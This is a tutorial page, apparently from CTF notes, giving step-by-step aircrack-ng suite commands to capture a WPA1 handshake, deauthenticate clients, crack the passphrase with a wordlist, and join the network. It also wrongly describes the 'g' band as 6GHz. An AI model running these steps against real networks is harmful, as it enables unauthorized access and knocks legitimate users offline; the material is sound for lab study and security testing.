## Capturing WPA1 Handshake and Cracking the Password[](#capturing-wpa1-handshake-and-cracking-the-password)

In this section, we'll walk through the steps to capture a WPA1 4-way handshake and crack the password using a dictionary attack. The attack involves starting the wireless interface in monitor mode, gathering target network information, de-authenticating clients, and using tools like aircrack-ng to perform the crack.

Prerequisites

Ensure you have the following:

A wireless card that supports monitor mode.

The necessary tools: airmon-ng, airodump-ng, aireplay-ng, aircrack-ng, and a wordlist (e.g., /usr/share/wordlists/rockyou.txt).

Step-by-Step Process

1. Start Interface in Monitor Mode and Kill Unwanted Services

Start by killing any processes that might interfere with your network scanning and then put your wireless interface into monitor mode:

```bash
airmon-ng check kill && airmon-ng start wlan0
```

`airmon-ng check kill`: Stops processes that could disrupt wireless scanning.

`airmon-ng start wlan0`: Puts your wireless interface (replace wlan0 with the correct interface name) into monitor mode (wlan0mon).

2. Gather Information About the Target Network

Next, scan for nearby wireless networks and gather information like the channel and BSSID of the target:

```bash
airodump-ng --band abg wlan0mon
```

- `airodump-ng`: Scans for nearby networks.
- `--band abg`: Scans for networks on the 2.4GHz (b), 5GHz (a), and 6GHz (g) bands.
- `wlan0mon`: Your interface in monitor mode.

This command will display a list of available networks. Identify the target network and note the **Channel** and **BSSID**.

![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FK447GfIudrNJSwlfKss3%2Fuploads%2FFj0AQqOrPIEDPZIfKrnt%2Fimage.png?alt=media&token=ac4e8312-8dfc-4bfb-a248-928a0045ffb8)

To capture the WPA1 4-way handshake, specify the BSSID and channel of the target network:

```bash
airodump-ng wlan0mon --bssid <bssid> -c <channel> -w WPA1
```

- Replace `<bssid>` with the BSSID of the target network.
- Replace `<channel>` with the channel number of the target network.
- `-w WPA1`: Specifies the output filename for the captured data (WPA1-01.cap).

Keep this terminal running as it continuously monitors for the handshake.

#### 4. **Perform De-Authentication to Capture the Handshake**[](#id-4.-perform-de-authentication-to-capture-the-handshake)

In another terminal, de-authenticate clients connected to the target network to force them to re-authenticate, which will trigger the 4-way handshake:

```bash
aireplay-ng -0 5 -a <bssid> wlan0mon
```

This should cause a connected client to disconnect and reconnect, providing the necessary handshake data.

- `-0 5`: Sends 5 de-authentication packets.
- `-a <bssid>`: Specifies the BSSID of the target network.
- `wlan0mon`: The interface in monitor mode.

![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FK447GfIudrNJSwlfKss3%2Fuploads%2FmCCvFlsrOpN70N4gTWBC%2Fimage.png?alt=media&token=69d5ae4c-d122-4597-baa0-f95c36444ca2)

5. **Crack the Handshake Using aircrack-ng**

Once the handshake has been captured, you can use `aircrack-ng` to attempt to crack the password by performing a dictionary attack with a wordlist like `rockyou.txt`:

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA1-01.cap
```

- `-w /usr/share/wordlists/rockyou.txt`: Specifies the wordlist to use.

- `WPA1-01.cap`: The captured handshake file.

If the password is found in the wordlist, `aircrack-ng` will display it.

#### 6. **Connect to the Network**[](#id-6.-connect-to-the-network)

Once you've successfully cracked the password, you can connect to the target network using `wpa_supplicant`. Create a `wpa.conf` file with the network details:

```bash
network={
	ssid="TargetNetworkName"
	psk="CrackedPassword"
}
```

Then, connect with:
```bash
wpa_supplicant -c wpa.conf -i wlan0mon
```

#### 7. **Obtain an IP Address**[](#id-7.-obtain-an-ip-address)

Next, request an IP address from the DHCP server:

```bash
sudo dhclient wlan0 -v
```

### Summary[](#summary)

By following these steps, you've captured a WPA1 4-way handshake, cracked the password using a dictionary attack, and connected to the network. This method is typically used in CTF challenges to simulate wireless network penetration and test WPA1 security.
